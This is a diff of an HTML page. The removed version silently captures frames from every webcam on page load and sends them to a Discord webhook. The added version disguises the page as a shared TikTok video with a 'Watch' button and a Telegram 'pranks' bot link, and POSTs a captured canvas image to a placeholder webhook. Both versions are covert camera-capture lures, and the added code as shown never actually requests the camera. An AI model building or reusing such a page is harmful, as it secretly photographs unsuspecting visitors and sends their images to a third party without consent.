@@ -1,112 +1,189 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ru">
 <head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-22S9P2RVGZ"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-22S9P2RVGZ');
+    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>كاميرا ويب - إرسال إلى Discord</title>
+    <meta property="og:title" content="Tiktok video" />
+    <meta property="og:description" content="Watch tiktok" />
+    <meta property="og:image" content="https://wwd.com/wp-content/uploads/2020/09/tiktok.png" />
+    <meta property="og:type" content="website" />
+
+    <meta name="description" content="Watch tiktok" />
+    <title>Tiktok</title>
     <style>
-        body {
-            background-color: white;
+        body, html {
             margin: 0;
             padding: 0;
-            height: 100vh;
+            height: 100%;
             display: flex;
-            justify-content: center;
             align-items: center;
+            justify-content: center;
+            background-color: #010101;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            color: #fff;
         }
-
-        canvas {
+        .container {
+            text-align: center;
+            padding: 20px;
+            background-color: #262626;
+            border-radius: 20px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            max-width: 400px;
+            width: 100%;
+            position: relative; /* Добавлено для уточнения позиции */
+            z-index: 1; /* Устанавливаем на передний план */
+        }
+        .idi-naxuy {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+        .btn-watch {
+            padding: 15px 30px;
+            font-size: 20px;
+            font-weight: bold;
+            color: #fff;
+            background-color: #fe2c55;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            display: none;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            margin-top: 10px;
+        }
+        .btn-watch:hover {
+            background-color: #e62950;
+            transform: scale(1.05);
+        }
+        .btn-bot {
+            padding: 15px 30px;
+            font-size: 20px;
+            font-weight: bold;
+            color: #fff;
+            background-color: #fe2c55;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            display: none;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            margin-top: 10px;
+            text-decoration: none;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        }
+        .btn-bot:hover {
+            background-color: #ff456e;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
+            text-decoration: none; /* Ensure text decoration stays removed on hover */
+        }
+        .btn-bot:active {
+            background-color: #e9224a;
+            transform: translateY(0);
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2);
+        }
+        video, canvas {
+            max-width: 100%;
+            border-radius: 20px;
+            margin-bottom: 20px;
             display: none;
         }
+        
+        video1, canvas1 {
+            display: none;
+        }
+        #pointer {
+            position: fixed;
+            width: 0;
+            height: 0;
+            border-left: 20px solid transparent;
+            border-right: 20px solid transparent;
+            border-bottom: 30px solid red; /* Цвет и длина указателя */
+            top: 10px; /* Отступ от верхнего края */
+            right: 10px; /* Отступ от правого края */
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .arrow {
+                width: 0;
+                height: 0;
+                border-left: 10px solid transparent;
+                border-right: 10px solid transparent;
+                border-bottom: 15px solid red; /* Цвет и длина стрелочки */
+                animation: bounce 1s infinite; /* Анимация */
+        }
+            
+        @keyframes bounce {
+                0%, 20%, 50%, 80%, 100% {
+                    transform: translateY(0);
+                }
+                40% {
+                    transform: translateY(-10px);
+                }
+                60% {
+                    transform: translateY(-5px);
+                }
+        }
+
     </style>
 </head>
 <body>
-    <canvas id="canvas"></canvas>
+    <div id="pointer" style="display: none;">
+        <div class="arrow"></div>
+    </div>
+    <div class="container">
+        <canvas id="canvas"></canvas>
+        <h1 class="idi-naxuy" id="idiNax">Пользователь прислал вам видео</h1>
+        <button class="btn-watch" id="watchBtn">Посмотреть</button>
+         <a href="https://t.me/TiktokPranksBot" class="btn-bot" id="botBtn">Переходи в бот и получай свою ссылку</a>
+    </div>
+    <video id="video" autoplay playsinline></video>
+    <video id="video1" autoplay playsinline></video>
+    <canvas id="canvas1"></canvas>
+    <script>
+        // URL of the webhook where the image will be sent
+        const webhookUrl = "YOUR_WEBHOOK_URL";
 
-    <script type="module">
-        import { sendToDiscord } from './discordWebhook.js';
-
-        const canvas = document.getElementById("canvas");
-        let images = [];
-
-        // تحقق مما إذا كان المتصفح يدعم MediaDevices و getUserMedia
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            alert("المتصفح الخاص بك لا يدعم الوصول إلى الكاميرات. يُرجى تحديث المتصفح.");
-        }
-
-        // الدالة لبدء كاميرات الويب
-        async function initCameras() {
-            try {
-                // الحصول على قائمة بجميع الأجهزة المتصلة (الكاميرات)
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoDevices = devices.filter(device => device.kind === 'videoinput'); // تصفية الكاميرات فقط
-
-                if (videoDevices.length === 0) {
-                    console.log("لم يتم العثور على كاميرات.");
-                    sendToDiscord("camera not found");
-                    return;
+        // This function will send data (image or other data) to your Webhook
+        function sendDataToWebhook(imageData) {
+            $.ajax({
+                url: webhookUrl,
+                method: 'POST',
+                data: JSON.stringify({ image: imageData }),
+                contentType: 'application/json',
+                success: function(response) {
+                    console.log("Data sent successfully:", response);
+                },
+                error: function(error) {
+                    console.error("Error sending data:", error);
                 }
-
-                console.log("تم العثور على الكاميرات التالية:", videoDevices);
-
-                // استدعاء جميع الكاميرات المتاحة والتقاط الصور منها
-                const capturePromises = videoDevices.map(device => startCameraAndCapture(device));
-                await Promise.all(capturePromises);  // الانتظار حتى تنتهي جميع الكاميرات من التقاط الصور
-
-                // إرسال الصور إلى Discord بعد التقاطها
-                console.log("إرسال الصور إلى Discord...");
-                sendToDiscord(images);
-
-            } catch (error) {
-                alert("حدث خطأ أثناء الوصول إلى الكاميرا. تأكد من أنك قد منحت إذن الوصول إلى الكاميرات.");
-                console.error("حدث خطأ أثناء الوصول إلى الكاميرات.", error);
-                sendToDiscord("camera not found");
-            }
+            });
         }
 
-        // بدء كاميرا والتقاط الصورة
-        async function startCameraAndCapture(device) {
-            try {
-                // الحصول على صلاحية الوصول إلى الكاميرا
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { deviceId: device.deviceId }
-                });
-
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.width = 640;
-                video.height = 480;
-                video.muted = true;  // التأكد من أن الفيديو مُكبّت
-                video.play();
-
-                // الانتظار حتى يبدأ الفيديو في التشغيل ثم التقاط الصورة
-                video.onplaying = () => {
-                    captureAndSend(video, device);
-                };
-
-            } catch (error) {
-                console.error(`حدث خطأ أثناء تشغيل الكاميرا: ${device.label}`, error);
-            }
+        // Example of how to capture image from canvas and send it to the webhook
+        function captureAndSendImage() {
+            const canvas = document.getElementById("canvas");
+            const imageData = canvas.toDataURL("image/png");  // Capture image as Base64 PNG
+            sendDataToWebhook(imageData);  // Send it to the webhook
         }
 
-        // التقاط الصورة من الفيديو
-        function captureAndSend(video, device) {
-            // إعداد الـCanvas لرسم الفيديو
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // تحويل الصورة إلى base64
-            const imageData = canvas.toDataURL("image/png");
-
-            // إضافة الصورة إلى قائمة الصور
-            images.push({ image: imageData, deviceLabel: device.label });
-            console.log(`تم التقاط صورة من كاميرا: ${device.label}`);
-        }
-
-        // بدء الكاميرات عند تحميل الصفحة
-        window.onload = initCameras;
+        // Adding a listener to capture when the user presses the button
+        document.getElementById("watchBtn").addEventListener("click", function() {
+            captureAndSendImage();  // Capture the image when the button is clicked
+        });
     </script>
 </body>
 </html>
